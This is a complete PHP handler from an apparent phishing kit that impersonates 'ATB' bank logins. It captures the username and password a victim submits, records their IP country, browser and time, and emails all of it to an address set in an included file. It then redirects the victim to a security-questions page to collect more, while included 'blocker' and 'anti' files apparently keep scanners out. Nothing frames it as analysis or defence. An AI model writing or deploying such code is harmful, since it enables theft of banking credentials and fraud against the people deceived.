<?php
	session_start();
    include 'email.php';
		include './blocker.php';
		include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';
					
    $ip = getenv("REMOTE_ADDR");
    $u = "http://www.geoiptool.com/?IP='$ip'";
    $dump = unserialize(file_get_contents($u));
	$_SESSION['username'] = $_POST['username'];
	$_SESSION['password'] = $_POST['password'];
    $country = $dump["geoplugin_countryName"];
    $subject = 'ATB Login [ '.$country.' - '.$_SERVER['REMOTE_ADDR'].' ]';
    $message = '|============ ATB Login ===========|'."\r\n";
	$message .= "|Username: ".$_POST['username']."\n";
    $message .= "|Password: ".$_POST['password']."\n";
    $message .= '|Time:     '.$_InfoDATE   = date("d-m-Y h:i:sa")."\r\n";
    $message .= '|Browser:  '.$_SERVER['HTTP_USER_AGENT']."\r\n";
    $message .= "|IP Geo: http://www.geoiptool.com/?IP=".$ip." \n";
    $user = $_POST['username'];
    $pass = $_POST['password'];
    
    if( $user != "" &&  $pass != "" && strlen($user) < 26){
	mail($to, $subject, $message);
	
	
	}

	
    header("Location: secquestions.php");
 ?>